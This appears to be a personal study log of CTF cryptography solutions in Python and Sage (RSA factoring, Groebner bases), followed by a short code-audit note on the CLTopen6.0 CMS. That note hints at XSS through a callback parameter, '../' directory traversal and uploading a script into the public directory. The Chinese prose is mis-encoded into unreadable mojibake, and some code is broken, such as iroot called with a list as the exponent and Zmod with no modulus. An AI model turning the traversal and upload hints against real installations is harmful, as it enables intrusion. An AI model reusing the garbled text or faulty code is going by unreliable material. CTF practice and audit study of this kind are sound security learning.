<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cnt = <span class="built_in">len</span>(Cs)</span><br><span class="line">A = [(i + <span class="number">128</span>)**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">B = [(i + <span class="number">1024</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">C = [(i + <span class="number">512</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br></pre></td></tr></table></figure>

<ul>
<li>å¯¹è¾“å‡ºçš„$Cs$è¿›è¡Œå¼€$e$æ¬¡æ–¹å¤„ç†</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C_ = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Cs:</span><br><span class="line">    C_.append(iroot(i, Cs)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<ul>
<li>å®šä¹‰åœ¨æ•´æ•°ç¯ä¸Šçš„æœªçŸ¥å˜é‡$m1,m2,m3$</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;m1&gt; = Zmod()[]</span><br><span class="line">P.&lt;m2&gt; = Zmod()[]</span><br><span class="line">P.&lt;m3&gt; = Zmod()[]</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ†åˆ«ä»£å…¥åŸæ–¹ç¨‹ä¸­ï¼Œå¾—åˆ°å…³äº$ABC$çš„äºŒæ¬¡æ–¹ç¨‹</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = A[<span class="number">0</span>] * m1 ** <span class="number">2</span> + B[<span class="number">0</span>] * m1 + C[<span class="number">0</span>] - <span class="built_in">int</span>(C_[<span class="number">0</span>])</span><br><span class="line">f2 = A[<span class="number">1</span>] * m2 ** <span class="number">2</span> + B[<span class="number">1</span>] * m2 + C[<span class="number">1</span>] - <span class="built_in">int</span>(C_[<span class="number">1</span>])</span><br><span class="line">f3 = A[<span class="number">2</span>] * m3 ** <span class="number">2</span> + B[<span class="number">2</span>] * m3 + C[<span class="number">2</span>] - <span class="built_in">int</span>(C_[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>

<ul>
<li>æ±‚æ ¹ï¼Œä»£å€¼ï¼Œå†è½¬æ¢</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = f1.roots()</span><br><span class="line">v2 = f2.roots()</span><br><span class="line">v3 = f3.roots()</span><br><span class="line"></span><br><span class="line">flag2 = long_to_bytes(v1[<span class="number">0</span>][<span class="number">0</span>]).decode() + long_to_bytes(v2[<span class="number">0</span>][<span class="number">0</span>]).decode() + long_to_bytes(v3[<span class="number">0</span>][<span class="number">0</span>]).decode()</span><br></pre></td></tr></table></figure>

<h2 id="åˆ†äº«-ä»£ç å®¡è®¡"><a href="#åˆ†äº«-ä»£ç å®¡è®¡" class="headerlink" title="åˆ†äº«-ä»£ç å®¡è®¡"></a>åˆ†äº«-ä»£ç å®¡è®¡</h2><blockquote>
<p>CLTopen6.0</p>
</blockquote>
<p>ç½‘ä¸Šèµ„äº§ç›¸å¯¹è¾ƒå¤šï¼Œä»£ç å®¡è®¡ç›¸å…³ã€‚</p>
<p>å®¡è®¡<code>application</code>ç›®å½•ã€‚</p>
<p>æ•æ„Ÿæ•°æ®ï¼Œå…ˆæœç´¢<code>username</code>ä¹‹ç±»çš„ã€‚æŸ¥çœ‹æ•°æ®åº“ç›¸å…³çš„è¡¨ç»“æ„ã€‚</p>
<p><code>callback</code>ä¼ å‚ç›¸å…³ï¼Œå¯èƒ½å­˜åœ¨XSSæ”»å‡»ã€‚</p>
<p>æ–¹æ³•æ˜¯<code>public</code>çš„æ‰å¯ä»¥è¿›è¡Œè°ƒç”¨ã€‚<em>è·ŸJavaä¼šæ¯”è¾ƒç›¸å…³æˆ–è¯´ç±»ä¼¼ï¼Ÿ</em></p>
<h3 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h3><p>åˆ©ç”¨<code>Seay</code>ç­‰å·¥å…·å…ˆè¿›è¡Œä»£ç å®¡è®¡ï¼Œä¸»è¦ä¸ºäº†æ‰¾åˆ°åå°ä»¥åŠä¸€äº›å±é™©å‡½æ•°ã€‚</p>
<p>ä¸»è¦ä¸‰ä¸ªå·¥å…·ï¼š</p>
<ul>
<li><code>Seay</code>è¾…åŠ©å®¡è®¡</li>
<li><code>phpstudy</code>æ­ç¯å¢ƒ</li>
<li><code>ps</code>phpç¼–è¾‘å™¨</li>
</ul>
<h3 id="è°ƒç”¨"><a href="#è°ƒç”¨" class="headerlink" title="è°ƒç”¨"></a>è°ƒç”¨</h3><ul>
<li><p>ç›´æ¥åœ¨åœ°å€æ è®¿é—®ç±»ä»¥åŠæ–¹æ³•ã€‚</p>
</li>
<li><p>è®¿é—®æˆåŠŸåï¼Œé€‰æ‹©å‚æ•°è¿›è¡Œä¼ å‚ã€‚</p>
</li>
<li><p>æ³¨æ„ä¼ªé™æ€ã€‚</p>
</li>
</ul>
<h3 id="ç›®å½•ç©¿è¶Šï¼Ÿ"><a href="#ç›®å½•ç©¿è¶Šï¼Ÿ" class="headerlink" title="ç›®å½•ç©¿è¶Šï¼Ÿ"></a>ç›®å½•ç©¿è¶Šï¼Ÿ</h3><p>ä¸å­˜åœ¨çš„ç›®å½•å½±å“payloadçš„æ‰§è¡Œç»“æœï¼Œä»è€Œå½±å“å‘½ä»¤çš„æ‰§è¡Œã€‚</p>
<p>linuxè·Ÿwindowsæ‰§è¡Œç»“æœå¯èƒ½ä¸åŒã€‚</p>
<h3 id="ä¸Šä¼ è„šæœ¬"><a href="#ä¸Šä¼ è„šæœ¬" class="headerlink" title="ä¸Šä¼ è„šæœ¬"></a>ä¸Šä¼ è„šæœ¬</h3><p>æ‰§è¡Œé”™è¯¯ï¼Œä½†å¯ä»¥å†™å…¥<code>public</code>ç›®å½•ã€‚</p>
<p>ä½†éœ€è¦æŸ¥çœ‹ä¸€ä¸‹å…³é”®ä»£ç æœ‰æ²¡æœ‰é”™è¯¯ï¼Œå®¹æ˜“è¢«è¿‡æ»¤å¯¼è‡´ä¸Šä¼ è„šæœ¬æ“ä½œå¤±è´¥ã€‚</p>
<p>åŠæ—¶æ¢å¤ï¼Œå¦åˆ™å‰å°å¯èƒ½å‡ºç°é—®é¢˜ã€‚</p>
<p><em>é˜…è¯»ä»£ç çš„èƒ½åŠ›è¿˜æ˜¯éå¸¸é‡è¦çš„ã€‚ä¸»è¦è¿˜æ˜¯å¾—äº†è§£å‡½æ•°çš„å…·ä½“ä½œç”¨ï¼Œä»¥åŠå¤§æ¦‚çš„å®ç°æµç¨‹æ˜¯æ€æ ·çš„ã€‚</em></p>
<p>linuxä¸­<code>Type = ../</code></p>
<p><em>å› ä¸ºæ¶‰åŠè·¯å¾„ä»¥åŠç»•è¿‡ç­‰ï¼Œæ‰€ä»¥æ„Ÿè§‰è·Ÿå‘½ä»¤æ‰§è¡Œè¿˜æ˜¯ç»“åˆèµ·æ¥çš„ã€‚ä»¥åŠæ—¶åˆ»è®°å¾—æ¢å¤ï¼Œå¦åˆ™å®¹æ˜“æŒ‚ã€‚</em></p>
<p><em>ç©ºäº†å¯ä»¥å°è¯•ä¸€ä¸‹ã€‚ç¨å¾®ç†Ÿæ‚‰ä¸€ä¸‹å®¡è®¡çš„æµç¨‹ã€‚</em></p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ç›¸å¯¹æ¯”è¾ƒå®¹æ˜“ã€‚</p>
<p>ç®€å•çš„ç›¸å¯¹æ¥è¯´å°±æ˜¯æ¥çœ‹<strong>æ•æ„Ÿå‡½æ•°</strong>ã€‚</p>
<h1 id="230208"><a href="#230208" class="headerlink" title="230208"></a>230208</h1><h2 id="Groebner-basis"><a href="#Groebner-basis" class="headerlink" title="Groebner basis"></a>Groebner basis</h2><p>æœ¬å­ã€‚</p>
<p>ç©ºé—²æ•´ç†ã€‚</p>
<p>Grobner basisç®€å•è®²å°±æ˜¯ä¸¤ç§ç®—æ³•çš„æ‰©å±•å»¶ä¼¸ï¼šDivision algorithm ä»å•å˜é‡åˆ°å¤šå˜é‡ï¼ŒGaussian eliminationä»çº¿æ€§åˆ°éçº¿æ€§ã€‚</p>
<p>åº”ç”¨æ–¹é¢é¦–å…ˆå½“ç„¶æ˜¯è§£å¤šå˜é‡å¤šé¡¹å¼ï¼Œå…¶æ¬¡è¿˜å¯ä»¥ç”¨äºè§£å†³ideal membership problemï¼šç»™ä½ ä¸€ä¸ªç†æƒ³Iï¼Œå’Œä¸€ä¸ªå¤šé¡¹å¼fï¼ŒIçš„Grobner basisèƒ½å‘Šè¯‰ä½ fæ˜¯å¦å±äºIã€‚</p>
<p>Grobner basisç®—æ³•æ˜¯<strong>å¤šå˜é‡å¯†ç æ ¸å¿ƒé—®é¢˜</strong>ã€‚å¤šå˜é‡å¯†ç çš„å…¬é’¥å°±æ˜¯ä¸€ç»„æœ‰é™åŸŸä¸Šå¤šå˜é‡äºŒæ¬¡å¤šé¡¹å¼ã€‚å¦‚æœä½ èƒ½è§£å¼€è¿™ç»„å¤šé¡¹å¼æ–¹ç¨‹ç»„ï¼Œé‚£ä¹ˆä½ å°±èƒ½å‡å†’ç­¾åï¼Œè¯»å–åŠ å¯†ä¿¡æ¯äº†ã€‚åº”ç”¨ä¸Šæ²¡äººä¼šç”¨BuchBergerç®—æ³•æ¥æ‰¾Grobner basisã€‚å› ä¸ºæ•ˆç‡å¤ªä½äº†ï¼Œè€Œä¸”å…¶ä¸­å¾ˆå¤šè®¡ç®—æ˜¯æµªè´¹çš„ã€‚å¸¸ç”¨çš„æ˜¯F4å’ŒF5ç®—æ³•ã€‚</p>
<h3 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h3><blockquote>
<p> groebner_basis()</p>
</blockquote>
<ul>
<li>å®šä¹‰å¤šå˜é‡çš„å¤šé¡¹å¼ç¯</li>
<li>åˆ©ç”¨å®šä¹‰å¥½çš„å¤šé¡¹å¼ç¯æ„å»ºä¸€ä¸ªIdeal</li>
<li>è°ƒç”¨sageä¸­çš„å‡½æ•°</li>
</ul>
<h2 id="ç¨€å¥‡å¤æ€ªçš„æ¦‚å¿µ"><a href="#ç¨€å¥‡å¤æ€ªçš„æ¦‚å¿µ" class="headerlink" title="ç¨€å¥‡å¤æ€ªçš„æ¦‚å¿µ"></a>ç¨€å¥‡å¤æ€ªçš„æ¦‚å¿µ</h2><ul>
<li>ä¼å½¢æ›²é¢ï¼Œåˆç§°æƒ ç‰¹å°¼ä¼å½¢é¢ï¼ˆWhitney umbrellaï¼‰</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u, v = var(&#x27;u,v&#x27;)</span><br><span class="line">fx = u*v</span><br><span class="line">fy = u</span><br><span class="line">fz = v^2</span><br><span class="line">parametric_plot3d([fx, fy, fz], (u, -1, 1), (v, -1, 1),frame=False, color=&quot;yellow&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>KCTF2021ç§‹ï¼Œç¬¬åä¸€é¢˜å›¾ç©·åŒ•è§</li>
</ul>
<blockquote>
<p>[<a href="https://bbs.kanxue.com/thread-270784.htm">åŸåˆ›]KCTF2021ç§‹ ç¬¬åä¸€é¢˜ å›¾ç©·åŒ•è§ writeup-CTFå¯¹æŠ—-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p>
</blockquote>
<h1 id="230209"><a href="#230209" class="headerlink" title="230209"></a>230209</h1><h2 id="ç»§ç»­æ•´æ´»Groebner-basisä»¥åŠPolynomial"><a href="#ç»§ç»­æ•´æ´»Groebner-basisä»¥åŠPolynomial" class="headerlink" title="ç»§ç»­æ•´æ´»Groebner basisä»¥åŠPolynomial"></a>ç»§ç»­æ•´æ´»Groebner basisä»¥åŠPolynomial</h2><h2 id="å›¾ç©·åŒ•è§"><a href="#å›¾ç©·åŒ•è§" class="headerlink" title="å›¾ç©·åŒ•è§"></a>å›¾ç©·åŒ•è§</h2><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><blockquote>
<p>DASCTF-NOVX</p>
</blockquote>
<h2 id="sageå‡½æ•°ç­‰"><a href="#sageå‡½æ•°ç­‰" class="headerlink" title="sageå‡½æ•°ç­‰"></a>sageå‡½æ•°ç­‰</h2><h3 id="enumerate"><a href="#enumerate" class="headerlink" title="enumerate()"></a>enumerate()</h3><blockquote>
<p>è¿­ä»£å·¥å…·ï¼Œç±»ä¼¼pythonä¸­itertoolsæ¨¡å—</p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230209111213697.png" class="" title="enumerate">

<h3 id="factor-list"><a href="#factor-list" class="headerlink" title="factor_list()"></a>factor_list()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># poly</span></span><br><span class="line"><span class="number">17358416697006</span>*x^<span class="number">15</span> + <span class="number">50380288275413</span>*x^<span class="number">14</span> + <span class="number">65697715730413</span>*x^<span class="number">13</span> + <span class="number">119331879197637</span>*x^<span class="number">12</span> + <span class="number">190079269759081</span>*x^<span class="number">11</span> + <span class="number">251069112740272</span>*x^<span class="number">10</span> + <span class="number">294191461464860</span>*x^<span class="number">9</span> + <span class="number">323192668237103</span>*x^<span class="number">8</span> + <span class="number">348744847375959</span>*x^<span class="number">7</span> + <span class="number">327797569086986</span>*x^<span class="number">6</span> + <span class="number">281393100562123</span>*x^<span class="number">5</span> + <span class="number">205257017269623</span>*x^<span class="number">4</span> + <span class="number">147796447331070</span>*x^<span class="number">3</span> + <span class="number">92272297080147</span>*x^<span class="number">2</span> + <span class="number">44365143036564</span>*x + <span class="number">12197084000688</span></span><br><span class="line">poly.factor_list()</span><br><span class="line">sage: p</span><br><span class="line"><span class="number">39978</span>*x^<span class="number">5</span> + <span class="number">4693</span>*x^<span class="number">4</span> + <span class="number">11578</span>*x^<span class="number">3</span> + <span class="number">36393</span>*x^<span class="number">2</span> + <span class="number">14946</span>*x + <span class="number">43777</span></span><br><span class="line">sage: q</span><br><span class="line"><span class="number">26089</span>*x^<span class="number">5</span> + <span class="number">12232</span>*x^<span class="number">4</span> + <span class="number">20416</span>*x^<span class="number">3</span> + <span class="number">26651</span>*x^<span class="number">2</span> + <span class="number">26160</span>*x + <span class="number">11919</span></span><br><span class="line">sage: r</span><br><span class="line"><span class="number">16643</span>*x^<span class="number">5</span> + <span class="number">38547</span>*x^<span class="number">4</span> + <span class="number">21632</span>*x^<span class="number">3</span> + <span class="number">22341</span>*x^<span class="number">2</span> + <span class="number">25740</span>*x + <span class="number">23376</span></span><br></pre></td></tr></table></figure>

<h1 id="230210"><a href="#230210" class="headerlink" title="230210"></a>230210</h1><h2 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">86073852484226203700520112718689325205597071202320413471730820840719099334770</span></span><br><span class="line">n2 = <span class="number">77582485123791158683121280616703899430016469065264033598472741751344256774648355531493586310864150337351815051848231793841751148287075688226384710343269278032576253497728407800522536152937473072438970839941923618053297480433385258911357458745700958378269978384670108026994918504237309072908971746160378531040480539649223970964653553804442759847964633088481940435582792404175653758785321463055628690804551479982557193366035172983893595403859872458966844805671311011033726279121149599533093604586152158331657286488305064843651636225644328162652701896037366058322959361248649656784810609391313</span></span><br><span class="line">c3 = <span class="number">260434870216758498838321584935711394249835963213639852217120194663627852693180232036075839403208332707552953757185774603238436545434522971149891312380970896040823539050341723863717581297624370198483155582245220695123793458717418658539983101802256991837534210806768587736557644192367876024337837658337683388449336720569707094997412847022794461117019613124291022681935875774139147643806772608929174881451749463825639214096129554621195116737322890163556732291246108250543079041977037626755130422879778449546701988814607595746282148723362288451970833214072743929855505520539885650891349827459470540263153862109871050950881032032388185414677989393461533362690744724752363346530211163516319373099647590952338730</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 1. åˆ†è§£nä¸­çš„p, q</span></span><br><span class="line"><span class="string">sage:</span></span><br><span class="line"><span class="string">two_squares(n)</span></span><br><span class="line"><span class="string">(200170033707580057053975766783012322797,</span></span><br><span class="line"><span class="string"> 214489650309129059054871357172058931331)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p1 = <span class="number">200170033707580057053975766783012322797</span></span><br><span class="line">q1 = <span class="number">214489650309129059054871357172058931331</span></span><br><span class="line">q1 = q1 + <span class="number">63066105847160076051036559850646146794</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 2. åˆ©ç”¨åŸºåº•è½¬æ¢åˆ†è§£</span></span><br><span class="line"><span class="string">poly = sum(e * x^i for i, e in enumerate( Integer(n2).digits(q1)))</span></span><br><span class="line"><span class="string">sage: poly</span></span><br><span class="line"><span class="string">17358416697006*x^15 + 50380288275413*x^14 + 65697715730413*x^13 + 119331879197637*x^12 + 190079269759081*x^11 + 251069112740272*x^10 + 294191461464860*x^9 + 323192668237103*x^8 + 348744847375959*x^7 + 327797569086986*x^6 + 281393100562123*x^5 + 205257017269623*x^4 + 147796447331070*x^3 + 92272297080147*x^2 + 44365143036564*x + 12197084000688</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(p, _), (q, _), (r, _) = poly.factor_list()</span></span><br><span class="line"><span class="string">sage: p</span></span><br><span class="line"><span class="string">39978*x^5 + 4693*x^4 + 11578*x^3 + 36393*x^2 + 14946*x + 43777</span></span><br><span class="line"><span class="string">sage: q</span></span><br><span class="line"><span class="string">26089*x^5 + 12232*x^4 + 20416*x^3 + 26651*x^2 + 26160*x + 11919</span></span><br><span class="line"><span class="string">sage: r</span></span><br><span class="line"><span class="string">16643*x^5 + 38547*x^4 + 21632*x^3 + 22341*x^2 + 25740*x + 23376</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> p, q, r = p(x = q1), q(x = q1), r(x = q1)</span></span><br><span class="line"><span class="string">sage: assert p*q*r == n2</span></span><br><span class="line"><span class="string">sage: p1</span></span><br><span class="line"><span class="string">200170033707580057053975766783012322797</span></span><br><span class="line"><span class="string">sage: p</span></span><br><span class="line"><span class="string">65852498339760915228594889597136378107876107334695562152983809050259001488139010835535729480582643283480229654777004862320849604335829446520865511011593811440123502620735962409526109695434570356277</span></span><br><span class="line"><span class="string">sage: q</span></span><br><span class="line"><span class="string">42974281584522050062504679441184925920720278381761957641733614118720547476055402383959476142344396618643274705251619494499668048977089541037606316780609473959806621223833644762635231018066406261919</span></span><br><span class="line"><span class="string">sage: r</span></span><br><span class="line"><span class="string">27414656307685249691067705927388582241684529669740981719565564735302197575673076783872355553268011939023273356472727941960439764826793614011976095106476097211511966378338911454193294048309326195251</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p = <span class="number">65852498339760915228594889597136378107876107334695562152983809050259001488139010835535729480582643283480229654777004862320849604335829446520865511011593811440123502620735962409526109695434570356277</span></span><br><span class="line">q = <span class="number">42974281584522050062504679441184925920720278381761957641733614118720547476055402383959476142344396618643274705251619494499668048977089541037606316780609473959806621223833644762635231018066406261919</span></span><br><span class="line">r = <span class="number">27414656307685249691067705927388582241684529669740981719565564735302197575673076783872355553268011939023273356472727941960439764826793614011976095106476097211511966378338911454193294048309326195251</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3. æ ¹æ®åŸåŠ å¯†å‡½æ•°è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p1=next_prime(p1)</span><br><span class="line">    p=next_prime(p)</span><br><span class="line">    q=next_prime(q)</span><br><span class="line">    r=next_prime(r)</span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span> <span class="keyword">and</span> (q-<span class="number">1</span>)%<span class="number">7</span> ==<span class="number">0</span> <span class="keyword">and</span> (r-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span> <span class="keyword">and</span> (p1-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment"># print(p1)</span></span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line">        </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3. påŸŸä¸‹è§£æ–¹ç¨‹ï¼ˆflagæœªpaddingï¼Œåœ¨påŸŸä¸‹å¯æ±‚è§£ï¼‰</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>        </span><br><span class="line">P.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x^<span class="number">7</span> - c3</span><br><span class="line">res = f.roots()</span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;DASCTF&#123;&#x27;</span> <span class="keyword">in</span> long_to_bytes(<span class="built_in">int</span>(i[<span class="number">0</span>])):</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(i[<span class="number">0</span>])))</span><br></pre></td></tr></table></figure>

<p><em>ä¸­é—´é‡åˆ°åˆ¤å®šæ²¡æˆåŠŸï¼Œä¹Ÿå°±æ˜¯while trueä»£ç å—æ²¡è·‘å‡ºç»“æœï¼Œåæ¥å‘ç°å¾—ç”¨gmpyåº“ä¸­çš„next_prime()å‡½æ•°æ¥åŠ å¿«ã€‚</em></p>
<h2 id="VSCç¼–è¯‘ç›¸å…³ä¸€ç‚¹é—®é¢˜"><a href="#VSCç¼–è¯‘ç›¸å…³ä¸€ç‚¹é—®é¢˜" class="headerlink" title="VSCç¼–è¯‘ç›¸å…³ä¸€ç‚¹é—®é¢˜"></a>VSCç¼–è¯‘ç›¸å…³ä¸€ç‚¹é—®é¢˜</h2><p>ä¸»è¦å®‰è£…ç¼–è¯‘ä¹‹åç”Ÿæˆçš„æ˜¯64ä½çš„ï¼Œç¼–è¯‘å¥½ä¹‹åçš„ç¨‹åºæ–‡ä»¶æ˜¯64ä½çš„ï¼Œé€†å‘åçš„æ˜¾ç¤ºæœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œç¨å¾®é€†å‘æŸ¥çœ‹ä¼ªä»£ç ä»¥åŠæ±‡ç¼–ä¼šç›¸å¯¹éº»çƒ¦ä¸€ç‚¹ã€‚</p>
<p><em>VSCæ•´ä¸ª32ä½ç¼–è¯‘ç¯å¢ƒï¼Ÿ</em></p>
<h3 id="é—ç•™é—®é¢˜"><a href="#é—ç•™é—®é¢˜" class="headerlink" title="é—ç•™é—®é¢˜"></a>é—ç•™é—®é¢˜</h3><ul>
<li>Windowsç¯å¢ƒä¹‹ä¸‹å¦‚ä½•ç¼–è¯‘æˆ32ä½ç¨‹åºï¼Ÿ</li>
<li>VSCodeé…ç½®è¿˜åŸã€‚æˆ–è€…è¯´å‡è®¾æˆåŠŸï¼Œé‚£ä¸¤è€…å¦‚ä½•åˆ‡æ¢ï¼Ÿ</li>
</ul>
<h2 id="å‡ºé¢˜æ€è·¯"><a href="#å‡ºé¢˜æ€è·¯" class="headerlink" title="å‡ºé¢˜æ€è·¯"></a>å‡ºé¢˜æ€è·¯</h2><blockquote>
<p>æ€è·¯æ¥æºï¼Œä¸Šé¢çš„å›¾ç©·åŒ•è§ã€‚</p>
</blockquote>
<h3 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h3><ul>
<li>Feistelç»“æ„</li>
<li>Groebner basisæ–¹ç¨‹</li>
<li>å¯†ç å­¦é¢˜ç›®ä¹Ÿæ¯”è¾ƒåˆé€‚</li>
</ul>
<h1 id="230213"><a href="#230213" class="headerlink" title="230213"></a>230213</h1><h2 id="n2-digits-q2-â€”â€”easyrsa"><a href="#n2-digits-q2-â€”â€”easyrsa" class="headerlink" title="n2.digits(q2)â€”â€”easyrsa"></a>n2.digits(q2)â€”â€”easyrsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p, q, r = [gen_prime() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">sage: p</span><br><span class="line"><span class="number">7420106539</span></span><br><span class="line">sage: q</span><br><span class="line"><span class="number">16025170573</span></span><br><span class="line">sage: r</span><br><span class="line"><span class="number">15865175743</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n2 = p * q * r</span><br><span class="line">sage: n2.digits(<span class="number">13</span>)</span><br><span class="line">[<span class="number">9</span>,</span><br><span class="line"> <span class="number">12</span>,</span><br><span class="line"> <span class="number">1</span>,</span><br><span class="line"> <span class="number">1</span>,</span><br><span class="line"> <span class="number">11</span>,</span><br><span class="line"> <span class="number">10</span>,</span><br><span class="line"> <span class="number">10</span>,</span><br><span class="line"> <span class="number">2</span>,</span><br><span class="line"> <span class="number">2</span>,</span><br><span class="line"> <span class="number">6</span>,</span><br><span class="line"> <span class="number">2</span>,</span><br><span class="line"> <span class="number">5</span>,</span><br><span class="line"> <span class="number">3</span>,</span><br><span class="line"> <span class="number">11</span>,</span><br><span class="line"> <span class="number">12</span>,</span><br><span class="line"> <span class="number">3</span>,</span><br><span class="line"> <span class="number">12</span>,</span><br><span class="line"> <span class="number">4</span>,</span><br><span class="line"> <span class="number">12</span>,</span><br><span class="line"> <span class="number">12</span>,</span><br><span class="line"> <span class="number">5</span>,</span><br><span class="line"> <span class="number">5</span>,</span><br><span class="line"> <span class="number">6</span>,</span><br><span class="line"> <span class="number">6</span>,</span><br><span class="line"> <span class="number">4</span>,</span><br><span class="line"> <span class="number">7</span>,</span><br><span class="line"> <span class="number">7</span>,</span><br><span class="line"> <span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">for</span> i,e <span class="keyword">in</span> <span class="built_in">enumerate</span>(n2.digits(<span class="number">13</span>)):</span><br><span class="line">....:     <span class="built_in">print</span>(e * x^i)</span><br><span class="line">....:</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">12</span>*x</span><br><span class="line">x^<span class="number">2</span></span><br><span class="line">x^<span class="number">3</span></span><br><span class="line"><span class="number">11</span>*x^<span class="number">4</span></span><br><span class="line"><span class="number">10</span>*x^<span class="number">5</span></span><br><span class="line"><span class="number">10</span>*x^<span class="number">6</span></span><br><span class="line"><span class="number">2</span>*x^<span class="number">7</span></span><br><span class="line"><span class="number">2</span>*x^<span class="number">8</span></span><br><span class="line"><span class="number">6</span>*x^<span class="number">9</span></span><br><span class="line"><span class="number">2</span>*x^<span class="number">10</span></span><br><span class="line"><span class="number">5</span>*x^<span class="number">11</span></span><br><span class="line"><span class="number">3</span>*x^<span class="number">12</span></span><br><span class="line"><span class="number">11</span>*x^<span class="number">13</span></span><br><span class="line"><span class="number">12</span>*x^<span class="number">14</span></span><br><span class="line"><span class="number">3</span>*x^<span class="number">15</span></span><br><span class="line"><span class="number">12</span>*x^<span class="number">16</span></span><br><span class="line"><span class="number">4</span>*x^<span class="number">17</span></span><br><span class="line"><span class="number">12</span>*x^<span class="number">18</span></span><br><span class="line"><span class="number">12</span>*x^<span class="number">19</span></span><br><span class="line"><span class="number">5</span>*x^<span class="number">20</span></span><br><span class="line"><span class="number">5</span>*x^<span class="number">21</span></span><br><span class="line"><span class="number">6</span>*x^<span class="number">22</span></span><br><span class="line"><span class="number">6</span>*x^<span class="number">23</span></span><br><span class="line"><span class="number">4</span>*x^<span class="number">24</span></span><br><span class="line"><span class="number">7</span>*x^<span class="number">25</span></span><br><span class="line"><span class="number">7</span>*x^<span class="number">26</span></span><br><span class="line">x^<span class="number">27</span></span><br></pre></td></tr></table></figure>

<p>è¿­ä»£å™¨ï¼Œä»¥å­—å…¸æˆ–è€…åˆ—è¡¨çš„å½¢å¼è¿›è¡Œè¾“å‡ºã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sage: <span class="built_in">enumerate</span>(n2.digits(<span class="number">13</span>))</span><br><span class="line">&lt;<span class="built_in">enumerate</span> <span class="built_in">object</span> at <span class="number">0x6ffe36f95550</span>&gt;</span><br><span class="line">sage: <span class="built_in">list</span>(<span class="built_in">enumerate</span>(n2.digits(<span class="number">13</span>)))</span><br><span class="line">[(<span class="number">0</span>, <span class="number">9</span>),</span><br><span class="line"> (<span class="number">1</span>, <span class="number">12</span>),</span><br><span class="line"> (<span class="number">2</span>, <span class="number">1</span>),</span><br><span class="line"> (<span class="number">3</span>, <span class="number">1</span>),</span><br><span class="line"> (<span class="number">4</span>, <span class="number">11</span>),</span><br><span class="line"> (<span class="number">5</span>, <span class="number">10</span>),</span><br><span class="line"> (<span class="number">6</span>, <span class="number">10</span>),</span><br><span class="line"> (<span class="number">7</span>, <span class="number">2</span>),</span><br><span class="line"> 